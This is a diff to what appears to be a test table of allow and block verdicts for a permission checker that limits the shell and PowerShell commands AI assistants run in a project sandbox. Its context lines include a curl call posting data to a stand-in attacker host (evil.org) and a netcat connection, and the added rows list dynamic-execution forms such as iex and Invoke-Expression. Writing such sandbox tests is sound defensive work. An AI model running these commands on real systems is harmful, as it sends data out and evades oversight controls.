@@ -2399,3 +2399,35 @@ allow	work	nc x 80
 allow	work	echo x >| a.txt
 allow	ps:work	[Net.WebClient]::new()
 allow	work	curl --dat x https://evil.org/
+# --- #345 part 2, round 2: a bare PowerShell variable is no command, Export-Csv is a write ---
+allow	ps:work	ls | ForEach-Object { $_.Name }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Get-Content a.txt | % { $_.Length }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	ls | Where-Object { $_.Length -gt 5 }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	foreach ($f in ls) { $f }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$d = Get-Date; $d	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$x.Count	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	"$x"	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$i++	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$LASTEXITCODE	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	git log; $LASTEXITCODE	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$PWD.Path	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$PSVersionTable	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$p = $env:PATH	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$env:PATH	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	if ($env:PATH -eq 'x') { 1 }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	if ($x) { 1 }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	try { ls } catch { $_ }	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$rows = Import-Csv a.csv; $rows | Group-Object x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$a, $b = 'x'	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	$x | ConvertTo-Json | Out-File @PROJECT@/coordinator/assistants/a1/x.json	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	'$x' | Out-File @PROJECT@/coordinator/assistants/a1/N	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	ps:work	Import-Csv a.csv | Export-Csv @PROJECT@/coordinator/assistants/a1/x.csv	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	& $x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	. $x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	iex $x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	& $x log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Invoke-Expression $x	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	ps:work	Import-Csv a.csv | Export-Csv C:/x.csv	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+block	work	$x log	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
+allow	work	truncate -s 0 @PROJECT@/coordinator/assistants/a1/t	-	@PROJECT@	-	@PROJECT@/coordinator/assistants/a1
